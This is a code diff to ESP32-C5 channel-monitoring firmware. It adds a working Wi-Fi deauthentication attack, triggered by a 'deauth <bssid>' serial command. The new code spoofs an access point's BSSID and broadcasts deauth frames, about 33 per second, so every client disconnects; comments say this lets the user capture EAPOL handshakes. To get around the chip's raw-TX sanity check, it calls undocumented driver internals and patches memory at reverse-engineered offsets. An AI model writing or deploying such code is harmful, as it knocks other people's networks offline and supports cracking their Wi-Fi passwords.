@@ -23,7 +23,7 @@ namespace {
 // ---------------------------------------------------------------------------------------------
 // Tunables
 // ---------------------------------------------------------------------------------------------
-constexpr const char* kVersion = "1.2";
+constexpr const char* kVersion = "1.2.2";
 constexpr uint32_t kDwellMs = 220;          // Dwell per channel (200–400 ms)
 constexpr uint32_t kUiIntervalMs = 120;     // UI refresh cadence
 constexpr int kStrongThresholdDbm = -65;    // "Strong" frame threshold
@@ -186,6 +186,34 @@ volatile uint32_t huntLastMs = 0;
 volatile uint32_t huntCount = 0;
 char huntLabel[33] = "";
 bool huntParked = false;
+
+// Deauth attack: spoof a BSSID and broadcast deauth/disassoc frames until stopped, so every station on that
+// network drops (they usually reconnect — with capture running you can grab the EAPOL handshakes).
+uint8_t deauthBssid[6] = {0};
+volatile bool deauthActive = false;
+bool deauthParked = false;      // like huntParked: we hold the park on the target's channel
+volatile uint32_t deauthSent = 0, deauthTxFail = 0;
+uint32_t deauthProbeSeen = 0;   // DIAGNOSTIC: bitmask of FC probe slots already reported (reset in startDeauth)
+
+// DIAGNOSTIC build 2: the driver-internal deauth path. These live in libnet80211.a with no public
+// header. send_deauth_no_bss builds a deauth frame with the driver's own encoding (FC low byte 0xC0,
+// i.e. a real "deauth" subtype on air) and TXes it via ic_tx_pkt, bypassing the raw-TX sanity check
+// that rejects our hand-rolled [C0]/[A0] frames.
+//   arg0: pointer to a word holding an ieee80211com* — g_ic+16 (STA) or g_ic+20 (AP); it panics on 0
+//   arg1: target MAC (the station being kicked, ends up as DA), arg2: reason code
+extern "C" {
+    int ieee80211_send_deauth_no_bss(void* hmacSlot, const uint8_t* mac, uint16_t reason);
+    // DIAGNOSTIC build 3 pieces — the driver builds the frame itself; we only steer which MACs go where.
+    void* ieee80211_alloc_deauth(void* hmacSlot, const uint8_t* macArg1, uint16_t reason);   // desc w/ reason at D+24, or NULL
+    void  ieee80211_send_setup(void* hmacSlot, void* desc, int x, int y, const uint8_t* m4, const uint8_t* m5, const uint8_t* m6);
+    void  ieee80211_set_tx_desc(void* hmacSlot, void* desc, int a, int b, int c);
+    void  ic_tx_pkt(void* desc);
+    extern void* g_ic;
+}
+// Word passed as arg0: holds the STA hmac pointer (g_ic+16). Padded so the driver's seq counter —
+// which send_setup increments at &flag+210 — lands in our own memory instead of a random neighbor.
+static uint8_t deauthSlotPad[256];
+uint8_t deauthHstate = 0xFF;     // *hmac+312: picks the DA/SA/BSSID mapping inside send_setup (0 / 1 / 3)
 
 // Single-producer (Wi-Fi task) / single-consumer (loop) ring buffer for captured frames.
 // Allocated from the heap only while a capture runs (32 KB), so it costs nothing otherwise.
@@ -869,7 +897,8 @@ wifi_band_mode_t toDriverBand(BandMode m) {
 
 void applyProtocols() {
     wifi_protocols_t protos = {};
-    protos.ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AX;
+    // LR in the 2.4 GHz set too, for parity with GhostESP's C5 attack profile (low-rate raw TX).
+    protos.ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AX | WIFI_PROTOCOL_LR;
     protos.ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX;
     errProto = esp_wifi_set_protocols(WIFI_IF_STA, &protos);
 }
@@ -889,6 +918,9 @@ void startWifi() {
     WiFi.persistent(false);
     WiFi.mode(WIFI_STA);     // esp_wifi_init + esp_wifi_start
     WiFi.setSleep(false);
+    (void)esp_wifi_set_max_tx_power(82);   // explicit TX power for raw injection (like Marauder's attack profile)
+    wifi_tx_rate_config_t txcfg = { .phymode = WIFI_PHY_MODE_HT20, .rate = WIFI_PHY_RATE_MCS0_LGI, .ersu = false, .dcm = false };
+    (void)esp_wifi_config_80211_tx(WIFI_IF_STA, &txcfg);   // raw mgmt-frame rate: 6 Mbps OFDM, works on both bands
 
     wifi_country_t country = {};
     memcpy(country.cc, kCountryCode, 2);
@@ -925,12 +957,15 @@ void stopWifi() {
     currentChannelNum = 0;
 }
 
+void stopDeauth();   // defined below with the hunt helpers; a mode change tears the attack down first
+
 // Switch band mode at runtime: clears per-channel history and restarts the sweep (or swaps radios).
 void setBandMode(BandMode m) {
     const BandMode prev = bandMode;
     if (m == prev) return;
     bandMode = m;
     captureEnabled = false;   // the host restarts a capture if it wants one (link type differs per radio)
+    stopDeauth();             // the attack is pinned to a channel: unpark, and the host can re-send it
     if (parkedIdx >= 0 && !chanEnabled(parkedIdx)) parkedIdx = -1;
     const bool radioChange = (prev == BAND_BLE) || (prev == BAND_154) || (m == BAND_BLE) || (m == BAND_154);
     if (radioChange) {
@@ -1066,8 +1101,17 @@ void printHunt() {
                   static_cast<unsigned long>(huntCount));
 }
 
+// [bssid, park channel (0 if hopping), frames sent]
+void printDeauth() {
+    if (!deauthActive) { Serial.print("\"deauth\":null"); return; }
+    char mac[26];
+    fmtMac(mac, sizeof(mac), deauthBssid);
+    Serial.printf("\"deauth\":[\"%s\",%d,%lu]", mac, parkedIdx >= 0 ? kChannels[parkedIdx] : 0,
+                  static_cast<unsigned long>(deauthSent));
+}
+
 void sendHello() {
-    if (!serialRoom(700)) return;
+    if (!serialRoom(780)) return;
     Serial.printf("{\"t\":\"hello\",\"fw\":\"bandwatch\",\"ver\":\"%s\",\"dwell_ms\":%u,\"band\":\"%s\",\"country\":\"%s\",\"bandmode\":\"%s\","
                   "\"proto\":\"%s\",\"promisc\":\"%s\",\"chs\":[",
                   kVersion, static_cast<unsigned>(kDwellMs), kBandName[bandMode], esp_err_to_name(errCountry), esp_err_to_name(errBand),
@@ -1089,19 +1133,21 @@ void sendHello() {
                   static_cast<unsigned long>(millis() / 1000), (rr >= 0 && rr < 16) ? kRst[rr] : "?",
                   huntActive ? "\"" : "null", huntActive ? mac : "", huntActive ? "\"" : "");
     printHunt();
+    Serial.print(",");
+    printDeauth();
     Serial.print("}\n");
 }
 
 void sendDwell(int idx) {
-    if (!serialRoom(260)) return;
+    if (!serialRoom(280)) return;
     const ChannelState& ch = channels[idx];
     Serial.printf("{\"t\":\"d\",\"c\":%u,\"s\":%.1f,\"r\":%.1f,\"f\":%lu,\"b\":%lu,\"st\":%u,\"u\":%u,"
-                  "\"g\":%.1f,\"n\":%lu,\"park\":%d,\"cap\":%d,\"drop\":%lu,",
+                  "\"g\":%.1f,\"n\":%lu,\"park\":%d,\"cap\":%d,\"drop\":%lu,\"da\":%lu,",
                   kChannels[idx], ch.busyEma, ch.busyCurrent,
                   static_cast<unsigned long>(ch.metrics.frames), static_cast<unsigned long>(ch.metrics.bytes),
                   ch.metrics.strong, ch.metrics.unique, globalActivityMax(),
                   static_cast<unsigned long>(sweepCount), parkedIdx >= 0 ? kChannels[parkedIdx] : 0,
-                  captureEnabled ? 1 : 0, static_cast<unsigned long>(capDropped));
+                  captureEnabled ? 1 : 0, static_cast<unsigned long>(capDropped), static_cast<unsigned long>(deauthSent));
     printHunt();
     Serial.print("}\n");
 }
@@ -1311,8 +1357,41 @@ void stopHunt() {
     if (currentPage == PAGE_HUNT) showPage(hopMode() ? PAGE_OVERVIEW : PAGE_DEVICES);
 }
 
+// Park on the AP's last-seen channel when we know it, so the frames actually land.
+void startDeauth(const uint8_t* mac) {
+    portENTER_CRITICAL(&g_devMux);
+    memcpy(deauthBssid, mac, 6);
+    int ch = 0;
+    for (int i = 0; i < kWifiDevSlots; i++) if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, mac)) { ch = wifiDevs[i].ch; break; }
+    deauthSent = 0;
+    deauthTxFail = 0;
+    deauthProbeSeen = 0;   // DIAGNOSTIC: report the probe verdicts again for this attack
+    // Note: the driver reads *adjacent* BSS words (&g_ic+16 / &g_ic+20 hold the STA/AP hmac pointers),
+    // not fields of the ic struct itself. Panic inside send_setup if the word is 0, so fall back to AP.
+    uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac (panic if 0)
+    if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP
+    memcpy(deauthSlotPad, &slotWord, 4);
+    deauthHstate = *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312);
+    deauthActive = true;
+    portEXIT_CRITICAL(&g_devMux);
+    (void)esp_wifi_set_max_tx_power(160);   // 16 dBm for the attack (startWifi's 8.2 dBm is tuned for quiet sniffing, not for range)
+    if (deauthParked) setPark(-1);                    // restart of a running attack: re-park below
+    deauthParked = false;
+    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauthParked = true; } }
+}
+
+void stopDeauth() {
+    if (!deauthActive) return;
+    portENTER_CRITICAL(&g_devMux);
+    deauthActive = false;
+    portEXIT_CRITICAL(&g_devMux);
+    // If hunt re-parked after us, this unparks its park too: last writer wins, hopping resumes.
+    if (deauthParked) { setPark(-1); deauthParked = false; }
+}
+
 void handleCommand(char* line) {
-    // Commands: "cap 0|1", "snap N", "park <ch>|0", "band 5g|2.4g|both|ble", "hunt <mac> [ch]" | "hunt 0", "info"
+    // Commands: "cap 0|1", "snap N", "park <ch>|0", "band 5g|2.4g|both|ble", "hunt <mac> [ch]" | "hunt 0",
+    //           "deauth <bssid>" | "deauth 0" (Wi-Fi modes only), "info"
     char* sp = strchr(line, ' ');
     char* arg = const_cast<char*>("");
     if (sp) { *sp = 0; arg = sp + 1; }
@@ -1378,6 +1457,20 @@ void handleCommand(char* line) {
             portEXIT_CRITICAL(&g_devMux);
             if (ch && parkedIdx < 0) { const int idx = indexOfChannel154(ch); if (idx >= 0) { setPark(idx); huntParked = true; } }
         }
+    } else if (!strcmp(line, "deauth")) {
+        uint8_t mac[6];
+        // Wi-Fi modes only: the frames go out on the STA interface. Unparseable arg or wrong mode stops it.
+        if (wifiMode() && parseMac(arg, mac)) startDeauth(mac);
+        else stopDeauth();
+        char m[26];
+        fmtMac(m, sizeof(m), deauthBssid);
+        const int ch = parkedIdx >= 0 ? kChannels[parkedIdx] : 0;   // startDeauth parks before this ack, so ch is known
+        if (deauthActive)
+            Serial.printf("{\"t\":\"ack\",\"cmd\":\"deauth\",\"deauth\":[\"%s\",%d,0],\"park\":%d}\n", m, ch, ch);
+        else
+            Serial.printf("{\"t\":\"ack\",\"cmd\":\"deauth\",\"deauth\":null,\"park\":%d}\n", ch);
+        if (deauthActive && serialRoom(140))   // DIAGNOSTIC: hmac slot used by the internal path + its state byte (picks the DA/SA mapping)
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth slot %lx hstate %d\"}\n", *(const uint32_t*)deauthSlotPad, deauthHstate);
     } else if (!strcmp(line, "reboot")) {
         Serial.print("{\"t\":\"ack\",\"cmd\":\"reboot\"}\n");
         delay(50);
@@ -1448,6 +1541,116 @@ void hopIfNeeded() {
         sweepCount += 1;
         sendSweep();
     }
+}
+
+// Deauth TX. One deauth/disassoc MPDU (26 bytes), DA broadcast so every station on the BSS hears it,
+// SA/BSSID = the AP we spoof. The C5 driver takes raw frames through esp_wifi_80211_tx (the older
+// esp_wifi_send_mgmt_frame API is not exposed by its public headers). Its sanity check gates on the FC
+// bytes: it accepts 0x8X/0xDX low-byte patterns and rejects both spec-clean 0x30 and GhostESP's 0xC0
+// (verified empirically, and in ieee80211_raw_frame_sanity_check inside libnet80211.a). High byte just
+// needs bit6 clear. So: deauth = [0x80, 0x03], disassoc = [0xD0, 0x04].
+// DIAGNOSTIC BUILD: one fixed FC pattern per burst slot, so air-side gaps in a client's stream can be
+// correlated to the tick phase (slot k fires at offset k of every ~480 ms pattern period).
+static const uint8_t kFcProbe[4][2] = {
+    { 0x80, 0x03 },   // slot 0: "beacon-ish" — accepted by the C5 sanity check
+    { 0xD0, 0x04 },   // slot 1: "action-ish" — accepted
+    { 0xC0, 0x03 },   // slot 2: deauth-ish — control (may be rejected here)
+    { 0xA0, 0x03 },   // slot 3: disassoc-ish — control (may be rejected)
+};
+
+void sendKickFrame(const uint8_t* bssid, bool disassoc, int probeIdx = -1) {
+    static uint32_t seq = 0;
+    const uint8_t fc0 = probeIdx >= 0 ? kFcProbe[probeIdx][0] : (disassoc ? 0xD0 : 0x80);
+    const uint8_t fc1 = probeIdx >= 0 ? kFcProbe[probeIdx][1] : 0x03;
+    uint8_t f[26];
+    f[0] = fc0;                                    // accepted by the C5 raw-TX sanity check (see above)
+    f[1] = fc1;                                    // deauth / disassociation subtype
+    f[2] = 0x3A; f[3] = 0x01;                      // duration (both working deauther templates use a non-zero value here)
+    memset(&f[4], 0xFF, 6);                        // DA: broadcast — kicks every station on the BSS
+    memcpy(&f[10], bssid, 6);                      // SA and...
+    memcpy(&f[16], bssid, 6);                      // ...BSSID: the AP we are spoofing
+    const uint32_t s = ((++seq) & 0x0FFFu) << 4;   // mgmt seq control, low nibble reserved
+    f[22] = static_cast<uint8_t>(s);
+    f[23] = static_cast<uint8_t>(s >> 8);
+    f[24] = 0x07; f[25] = 0x00;                    // reason: class-3 frame from non-assoc STA
+    const esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+    if (e == ESP_OK) deauthSent = deauthSent + 1;
+    else deauthTxFail = deauthTxFail + 1;
+    // DIAGNOSTIC: report each probe slot's first verdict once; unprobed failures every 32nd, not a storm.
+    if (probeIdx >= 0 && !(deauthProbeSeen & (1u << probeIdx))) {
+        deauthProbeSeen |= 1u << probeIdx;
+        if (serialRoom(200))
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth fc %02x: %s\"}\n", fc0, esp_err_to_name(e));
+    } else if (e != ESP_OK && probeIdx < 0 && (deauthTxFail & 31u) == 0 && serialRoom(160)) {
+        Serial.printf("{\"t\":\"log\",\"msg\":\"deauth tx: %s\"}\n", esp_err_to_name(e));
+    }
+}
+
+extern "C" int chm_is_at_home_channel(void);   // ROM fn, no args: 1 = radio on the STA's home channel
+
+// Drive the driver's own deauth frame construction (same helpers an AP uses to kick a station), so the
+// bytes are exactly what this chip family emits. The driver writes FC=[0xC0,x] plus duration/seq; we steer
+// the three address slots so DA=broadcast and SA=BSSID=the AP in every send_setup branch
+// (hstate 0 puts A6→DA, hstates 1/3 put A4/A6→SA/BSSID):
+//   hstate==0: A4=AP(SA)  A5=bcast(BSSID-ish) A6=bcast(DA)
+//   else:      A4=A6=AP   A5=bcast(DA)
+void sendInternalKick() {
+    static const uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    void* desc = ieee80211_alloc_deauth(deauthSlotPad, kBcastMac, 7);   // arg1 likely unused; reason 7 lands at D+24
+    if (!desc) { deauthTxFail = deauthTxFail + 1; return; }
+    // Mirror send_deauth_no_bss's ebuf-header bit juggling: desc[+4] holds the ebuf pointer P, and the
+    // bits live in the first word P points at.
+    volatile uint32_t* ebw = reinterpret_cast<volatile uint32_t*>(*reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 4));
+    uint32_t v = *ebw;
+    v |= 0x80000u | 0x40000u;
+    v &= ~0xE0000u;
+    v &= 0xFFFFF000u;
+    v |= 0x1C000u;   // build 8: (param+len)<<16 with len 26, so the reason code fits on air after ppTxPkt's +8 shift
+    *ebw = v;
+    ieee80211_send_setup(deauthSlotPad, desc, 192, 16,
+                         deauthBssid,                                     // A4 → SA in every branch (the AP we spoof)
+                         kBcastMac,                                       // A5 → DA (hstates 1/3) / BSSID slot (hstate 0)
+                         deauthHstate == 0 ? kBcastMac : deauthBssid);   // A6 → DA (hstate 0) / SA+BSSID (hstates 1/3)
+    ieee80211_set_tx_desc(deauthSlotPad, desc, 7, 16, 0);
+    const uint32_t d56 = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 56);
+    if (d56) {
+        *reinterpret_cast<volatile uint32_t*>(d56 + 20) |= 4;   // the same state bit send_deauth_no_bss flips
+        *reinterpret_cast<volatile uint32_t*>(d56) |= 1;        // robust-mgmt flag (get_robustmgtframe's bit — WPA2 stations can demand it)
+    }
+    // Frame data D sits at *(P+4) (same double-deref as above), and desc[+40]&2 shifts all addresses by +8.
+    const uint32_t P = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 4);
+    if (P) {
+        uint8_t* D = reinterpret_cast<uint8_t*>(*reinterpret_cast<volatile uint32_t*>(P + 4));
+        const size_t off = (*reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40) & 2u) ? 8 : 0;
+        if (deauthHstate == 0)   // hstate-0 branch puts broadcast in the BSSID slot → patch so SA==BSSID like a real AP kick
+            memcpy(D + 16 + off, deauthBssid, 6);
+        D[off] = 0xC8;  D[1 + off] = 0x02;   // match the real TP-Link deauths seen on this BSS: FC [C8 02], dur 0x32
+        D[2 + off] = 0x32;  D[3 + off] = 0x00;
+    }
+    *reinterpret_cast<volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20) = 26;   // len 24→26 so the reason code fits on air (ppTxPkt prepends an 8-byte prefix)
+    if (chm_is_at_home_channel()) ic_tx_pkt(desc);                   // TX now…
+    else {                                                            // …or append to the deferred queue at g_ic+440 (tail of .next slots)
+        char** tailSlot = reinterpret_cast<char**>(reinterpret_cast<char*>(&g_ic) + 440);
+        *reinterpret_cast<volatile uint32_t*>(reinterpret_cast<char*>(desc) + 52) = 0;
+        *reinterpret_cast<volatile uint32_t*>(*tailSlot) = reinterpret_cast<uint32_t>(desc);
+        *tailSlot = reinterpret_cast<char*>(desc) + 52;
+    }
+    deauthSent = deauthSent + 1;
+}
+
+// Called from uiTimerCb (~120 ms): four frames per tick ≈ 33/s — enough to drop a network,
+// polite enough not to blank the whole street.
+void serviceDeauth() {
+    if (!deauthActive || !wifiRunning) return;
+    if (*(const uint32_t*)deauthSlotPad) {   // driver-internal deauth with spoofed SA/BSSID (the normal case)
+        for (int k = 0; k < 4; k++) sendInternalKick();
+    } else {
+        for (int k = 0; k < 4; k++) sendKickFrame(deauthBssid, false, k);   // no slot: fall back to raw [80] kicks
+    }
+    if (deauthSent == 4 && serialRoom(160))   // one report after the first burst: home-channel flag + deferred-TX queue words (g_ic+436/+440)
+        Serial.printf("{\"t\":\"log\",\"msg\":\"home %d q %lx/%lx\"}\n", chm_is_at_home_channel(),
+                      *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 436),
+                      *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 440));
 }
 
 // ---------------------------------------------------------------------------------------------
@@ -1992,8 +2195,13 @@ void refreshSystem(float global) {
                                  static_cast<unsigned long>(capDropped));
     else snprintf(buf, sizeof(buf), "capture: off (host: cap 1)");
     lv_label_set_text(sysLines[n++], buf);
-    if (huntActive) { char m[26]; huntIdText(m, sizeof(m)); snprintf(buf, sizeof(buf), "hunt: %s", m); }
-    else snprintf(buf, sizeof(buf), "hunt: off");
+    if (huntActive) { char m[26]; huntIdText(m, sizeof(m)); snprintf(buf, sizeof(buf), "hunt %s", m); }
+    else snprintf(buf, sizeof(buf), "hunt off");
+    if (deauthActive) {
+        char d[26];
+        fmtMac(d, sizeof(d), deauthBssid);
+        snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), " · kick %s", d);   // buf is 64: both MACs fit
+    }
     lv_label_set_text(sysLines[n++], buf);
     snprintf(buf, sizeof(buf), "radio %s/%s/%s", errBand == ESP_OK ? "band ok" : "band ERR",
              errCountry == ESP_OK ? "cc ok" : "cc ERR", errPromisc == ESP_OK ? "promisc ok" : "promisc ERR");
@@ -2006,6 +2214,7 @@ void refreshSystem(float global) {
 }
 
 void driveLed(float global) {
+    if (deauthActive) { setLedColor(LED_RED, static_cast<uint8_t>((millis() / kUiIntervalMs & 1u) ? 12 : 70)); return; }   // blink while kicking
     if (huntActive) {
         const uint32_t last = huntLastMs;
         if (!last || millis() - last > 5000) { setLedColor(LED_BLUE, 15); return; }
@@ -2056,6 +2265,7 @@ void refreshUi() {
 void uiTimerCb(lv_timer_t* t) {
     (void)t;
     hopIfNeeded();
+    serviceDeauth();
     refreshUi();
 }
 
